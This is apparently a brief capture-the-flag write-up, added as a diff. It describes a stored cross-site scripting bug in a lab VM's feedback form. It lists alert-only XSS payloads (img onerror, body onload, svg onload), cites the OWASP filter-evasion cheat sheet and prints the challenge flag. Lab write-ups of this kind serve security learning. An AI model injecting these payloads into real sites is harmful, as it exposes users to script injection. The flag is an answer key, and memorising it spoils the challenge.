@@ -1,0 +1,19 @@
+modify form on http://192.168.56.101/?page=feedback
+change title size = 100
+
+insert
+<img src="/" onerror="alert(String.fromCharCode(88,83,83))">
+or
+<BODY ONLOAD=alert('XSS')>
+or
+<svg/onload=alert('XSS')>
+or etc…
+
+and a random comment and here is the xss
+
+source https://owasp.org/www-community/xss-filter-evasion-cheatsheet
+
+to get the flag:
+type script in comment area…
+
+FLAG: 0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e
